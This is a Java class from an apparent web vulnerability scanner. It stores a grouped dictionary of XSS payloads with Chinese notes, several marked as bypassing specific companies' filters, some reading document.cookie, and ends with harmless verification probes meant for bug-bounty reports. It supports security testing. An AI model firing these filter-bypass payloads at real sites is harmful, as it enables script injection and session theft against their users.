package com.xzhscan.dictionary;

import java.util.List;
import java.util.Map;
import java.util.LinkedHashMap;
import java.util.stream.Collectors;

/**
 * XSS 字典（Dictionary 页签 · XSS 字典子页）。
 *
 * 条目为实战收集 payload 原样入库（分组展示、备注保留原始测试结论，如
 * "过携程和 oppo"/"需要双击"）；正文里的 %编码与反斜杠 u/x 转义序列属
 * payload 的一部分，非源码残留。
 */
public final class XssDict {

    private XssDict() {
    }

    private static final Map<String, List<DictEntry>> BY_GROUP = build();

    public static List<DictEntry> all() {
        return BY_GROUP.values().stream().flatMap(List::stream).collect(Collectors.toList());
    }

    public static List<String> categories() {
        return List.copyOf(BY_GROUP.keySet());
    }

    public static List<DictEntry> byCategory(String group) {
        List<DictEntry> list = BY_GROUP.get(group);
        return list == null ? List.of() : List.copyOf(list);
    }

    private static Map<String, List<DictEntry>> build() {
        Map<String, List<DictEntry>> m = new LinkedHashMap<>();

        // ---------- 1. 闭合逃逸与混合大包 ----------
        m.put("闭合逃逸与混合大包", List.of(
                new DictEntry("闭合逃逸与混合大包", "textarea 逃逸 + 属性注入大杂烩",
                        "</tExtArEa>'\"<xhzeem attr=\"--- \nx=\"=='='onmouseover=confirm`x1s2s3` "
                                + "style=\"display:block;width:1000px;height:1000px;background:red\">--- ",
                        "闭合 textarea 后属性位触发；大块高亮 style 便于目视命中"),
                new DictEntry("闭合逃逸与混合大包", "伪协议 a 标签 + Tab 编码（bypass 百度/阿里巴巴）",
                        "</tExtArEa>'\"<a/href=\"ja%26Tab;vas%26Tab;cript%26Tab;%26Tab;%26Tab;:%26Tab;%26Tab;"
                                + "top%26Tab;[8680439..toString(30)]()\">click_me</a>#",
                        "%26Tab; 即 &Tab; 编码；toString(30) 还原 alert。备注：bypass 百度、阿里巴巴"),
                new DictEntry("闭合逃逸与混合大包", "URL 全编码 script（存储型直插）",
                        "<script%20type=\"text/javascript\">%20var%20reg%20=%20/test/;%20var%20str%20=%20"
                                + "%27testString%27;%20var%20result%20=%20reg.exec(str);%20alert(result);%20</script>",
                        "整段 URL 编码过内容过滤"),
                new DictEntry("闭合逃逸与混合大包", "闭合引号 + 标签直入",
                        "\"\"><script>alert(1)</script>",
                        "属性闭合 \"\"> 最常见入口")));

        // ---------- 2. 基础 alert 矩阵（双写/大小写绕过） ----------
        m.put("基础 alert 矩阵", List.of(
                new DictEntry("基础 alert 矩阵", "script 直入",
                        "<script>alert(1)</script>\n<script>alert(2)</script>",
                        "一整个 xss 大混杂的基础形态"),
                new DictEntry("基础 alert 矩阵", "双写绕过",
                        "<sc<script>ript>alert(4)</script>",
                        "过滤删 <script> 后残余拼回完整标签"),
                new DictEntry("基础 alert 矩阵", "大小写混淆",
                        "<ScRipt>alert(5)</script>",
                        "区分大小写的黑名单绕过"),
                new DictEntry("基础 alert 矩阵", "img onerror",
                        "<img src=1 onerror=alert(7)>",
                        "经典事件位"),
                new DictEntry("基础 alert 矩阵", "onmouseover 引号变形",
                        "onmouseover=¡¯alert(9)¡¯",
                        "原笔记：引号位可用 ¯ 变体（原文保留）"),
                new DictEntry("基础 alert 矩阵", "table background 伪协议",
                        ">"
                                + "\"'><img src=\"javascript.:alert(12)\">\n"
                                + ">"
                                + "\"'><script>alert(13)</script>\n"
                                + "<table background='javascript.:alert(14)'></table>\n"
                                + "<object type=text/html data='javascript.:alert(15);'></object>\n"
                                + "\"+alert(16)+\"",
                        "javascript.: 写法过正则；object data 伪协议")));

        // ---------- 3. 事件与标签变形 ----------
        m.put("事件与标签变形", List.of(
                new DictEntry("事件与标签变形", "style onload",
                        "<sTylE OnLoAd=alert(1)>",
                        "大小写混淆变形"),
                new DictEntry("事件与标签变形", "details ontoggle（prompt，过携程和 oppo）",
                        "<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=prompt,a()%20x>",
                        "%0A 换行分隔属性。备注：过携程和 oppo"),
                new DictEntry("事件与标签变形", "details ontoggle（confirm，过携程和 oppo）",
                        "<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a()%20x>",
                        "备注：过携程和 oppo"),
                new DictEntry("事件与标签变形", "onmouseover 变量赋值（过 oppo）",
                        "22onmouseover=%22a=confirm,a(document.cookie)%22--+//%23",
                        "备注：过 oppo；--+// 注释收尾"),
                new DictEntry("事件与标签变形", "details ontoggle 取 cookie",
                        "<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a(document.cookie)%20x>",
                        "confirm(document.cookie)"),
                new DictEntry("事件与标签变形", "svg onmouseover 系",
                        "<svg%20onmouseover%0A=%0Aa=confirm,a(1)>\n"
                                + "<svg%0Aonmouseover%0A=%0Aa=confirm,a(1)%20x>\n"
                                + "<svg%20onmouseover%0A=%0Aa=confirm,a(document.cookie)>",
                        "%0A 换行 + x 后缀截断"),
                new DictEntry("事件与标签变形", "onclick 赋值系（注释规则：--+ 与 //）",
                        "'+onclick=a=alert,a(1)%2F%2F\n"
                                + "'+onclick=a=alert,a(1)--+\n"
                                + "'+onclick=a=confirm,a(1)--+\n"
                                + "'+onclick=a=confirm,a(1)%2F%2F\n"
                                + "%27+onclick='a=alert,a(1)'--+",
                        "原笔记：标签注释用 --+ 和 //，经测试 %23 无效；onload 不能用就换其他属性"),
                new DictEntry("事件与标签变形", "marquee onstart（含大小写混淆）",
                        "<marquee behavior=\"alternate\" onstart=alert(1)>123</marquee>\n"
                                + "<MaRQuEe BehAvIor=\"alternate\" onStArt=alert(1)>123</MaRQuEe>",
                        "behavior=alternate 保证 onstart 触发"),
                new DictEntry("事件与标签变形", "body onpageshow",
                        "<body onpageshow=alert(1)>\n<body onPAgeShoW=confirm(111)>",
                        "页面载入事件，存储型直插"),
                new DictEntry("事件与标签变形", "details ontoggle 基础",
                        "<details ontoggle=alert()>",
                        "原笔记：向下按钮 xss"),
                new DictEntry("事件与标签变形", "details open ontoggle（不弹窗也有 XSS 面）",
                        "<details open ontoggle=alert(1)>\n<details open ontoggle=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
                        "原笔记：这个可能不弹窗，但是可以造成 xss；第二行 unicode 编码 'a'"),
                new DictEntry("事件与标签变形", "details%20ontoggle=confirm()",
                        "<details%20ontoggle=confirm()>//",
                        "原笔记：弹窗！")));

        // ---------- 4. 编码与伪协议 ----------
        m.put("编码与伪协议", List.of(
                new DictEntry("编码与伪协议", "svg eval(atob)",
                        "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));</script>",
                        "atob 解码 = alert(document.cookie)"),
                new DictEntry("编码与伪协议", "svg onload setInterval + \\x28",
                        "<svg onload=setInterval`alert\\x28document.domain\\x29`>",
                        "反引号调用 + \\x28( 转义；payload 原文含 \\x28，此处为源码级双写"),
                new DictEntry("编码与伪协议", "img srcset 收尾大杂烩",
                        "<!'/*\"/*/'/*/\"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>",
                        "注释碎片闭合 script 后 img onerror"),
                new DictEntry("编码与伪协议", "img onerror unicode 函数名",
                        "<img/src/onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
                        "\\u0061\\u006c\\u0065\\u0072\\u0074 = alert"),
                new DictEntry("编码与伪协议", "%00 混合 svg onload",
                        "<%00EEEE<svg /\\/\\//ONLoad='a\\u006c\\u0065\\u0072\\u0074(1)'/\\/\\/\\>svg>",
                        "\\u006c\\u0065\\u0072\\u0074 = lert；路径杂讯"),
                new DictEntry("编码与伪协议", "svg set end 事件",
                        "<svg><set end=1 onend=[1].find(alert)>",
                        "SMIL set 元素 onend，部分过滤器不识 set"),
                new DictEntry("编码与伪协议", "constructor.constructor 双层取 alert",
                        "<img src=1 onerror=javascript:{{constructor.constructor('alert(1)')()}}>\n"
                                + "<a href=javascript:{{constructor.constructor('alert(1)')()}}>dianwo</a>\n"
                                + "<a href=javascript:<x ng-app>{{constructor.constructor('alert(1)')()}}>dianwo</a>",
                        "Angular {{}} 沙箱逃逸；第三条带 ng-app 指令"),
                new DictEntry("编码与伪协议", "伪协议 a 标签（点击一次）",
                        "<a href=javascript:{{constructor.constructor('alert(1)')()}}>dianwo</a>",
                        "备注：点击一次")));

        // ---------- 5. 需要交互（点击/双击） ----------
        m.put("需要交互（点击/双击）", List.of(
                new DictEntry("需要交互（点击/双击）", "d3 变形 onclick",
                        "<d3\"<\"/onclick=\"1>[confirm``]\"<\">dianwo",
                        "备注：需要点击"),
                new DictEntry("需要交互（点击/双击）", "w 属性杂讯 onclick",
                        "<w=\"/x=\"y>\"/oNCliCk=`<`[confir\\u006d``]>dianwo",
                        "备注：需要点击；confir\\u006d = confirm"),
                new DictEntry("需要交互（点击/双击）", "w 属性杂讯 ondblclick（两形态）",
                        "<w=\"/x=\"y>\"/ondblclick=`<`[confir\\u006d``]>dianwo2\n"
                                + "<w=\"/x=\"y>\"/oNDblCliCk=`<`[confir\\u006d``]>dianwo2",
                        "备注：需要双击"),
                new DictEntry("需要交互（点击/双击）", "d3 ondblclick",
                        "<d3\"<\"/oNDblCliCk=\"1>[confirm``]\"<\">dianwo",
                        "备注：需要双击")));

        // ---------- 6. 特殊环境 ----------
        m.put("特殊环境", List.of(
                new DictEntry("特殊环境", "邮箱框 xss（验证）",
                        "\"\"><s>12356789@qq.com",
                        "原笔记：邮箱 xss(验证)——邮箱框回显位闭合")));

        // ---------- 7. 无危害验证 payload（不执行 JS，SRC 报告友好） ----------
        m.put("无危害验证 payload", List.of(
                new DictEntry("无危害验证 payload", "闭合引号标签 + textarea 逃逸",
                        "'\"></tExtArEa><s>123#//--+",
                        "无危害验证：不执行 JS；标签/文本差分确认注入点生效，报告可写\"未构造可利用 payload\""),
                new DictEntry("无危害验证 payload", "裸标签",
                        "<s>123",
                        "无危害验证：<s> 标签渲染确认输出位未被编码"),
                new DictEntry("无危害验证 payload", "h1 标题标签",
                        "<h1>123</h1>",
                        "无危害验证：视觉可辨（标题放大），适合截图取证"),
                new DictEntry("无危害验证 payload", "p 段落标签",
                        "<p>123</p>",
                        "无危害验证：同上"),
                new DictEntry("无危害验证 payload", "textarea 逃逸 + h1",
                        "</tExtArEa><h1>123</h1>#",
                        "无危害验证：textarea 闭合 + 标题渲染"),
                new DictEntry("无危害验证 payload", "闭合引号 + textarea 逃逸（变体）",
                        "'\"></tExtArEa><s>123#//--+",
                        "与首条同型；多次提交可验证缓存/去重差异。原笔记：该组 payload 出现两次")));

        return m;
    }
}
